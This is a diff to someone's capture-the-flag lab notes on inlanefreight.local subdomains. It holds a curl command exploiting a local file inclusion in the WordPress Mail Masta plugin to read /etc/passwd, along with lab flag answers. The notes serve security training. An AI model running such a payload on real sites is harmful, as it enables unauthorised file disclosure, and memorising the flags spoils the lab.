@@ -510,8 +510,7 @@ Interesting Finding(s):
 [+] Elapsed time: 00:01:18
 ```
 
-
-
+mail masta lfi:
 
 ```shell
 curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
@@ -611,6 +610,8 @@ all img
 HTB{dbca4dc5d99cdb3311404ea74921553c}
 
 ## careers.inlanefreight.local
+
+all img
 
 HTB{8f40ecf17f681612246fa5728c159e46}
 
